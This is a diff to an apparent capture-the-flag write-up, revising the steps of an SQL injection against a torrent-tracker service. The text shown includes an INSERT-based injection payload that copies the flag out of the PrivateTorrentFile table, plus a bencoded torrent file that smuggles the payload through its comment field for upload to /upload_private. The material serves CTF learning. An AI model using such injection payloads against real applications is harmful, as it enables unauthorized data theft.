@@ -97,9 +97,7 @@ We can steal flag directly from **PrivateTorrentFile** table:
 `INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES (''||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'', '', '', 0, '0', '', <hacker_username>);`
 
 #### Performing a query
-So, we now can detect the necessary query. How to execute it?
-
-At first it is need to go from our query to exact torrent file. I.e. build associative array:
+We constructed a request to do what we want. Now we need to make him executed. To do it we need to place the request in a torrent-file and upload it:
 ```python
 {
     'announce': '0',
@@ -113,9 +111,10 @@ At first it is need to go from our query to exact torrent file. I.e. build assoc
     }
 }
 ```
-Then, generate torrent file with using function `make_dictionary` from `torrent_format/bencoder`:
+Then, generate torrent file using a function `make_dictionary` from `torrent_format/bencoder`:
+
 `d8:announce0:4:infod7:comment96:'||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'6:lengthi0e4:name0:12:piece lengthi0e6:pieces0:ee`
 
-Finally, make POST request with uploading this file to `/upload_private`. Now we successfully executed our **insert query**.
+Finally, make POST request to upload this file to `/upload_private`. Now we successfully executed our **insert query**.
 
-Stolen Flag is already in the **PrivateTorrentFile** table.
+Now we managed to place the flag in the **PrivateTorrentFile** table. It can be got using ....
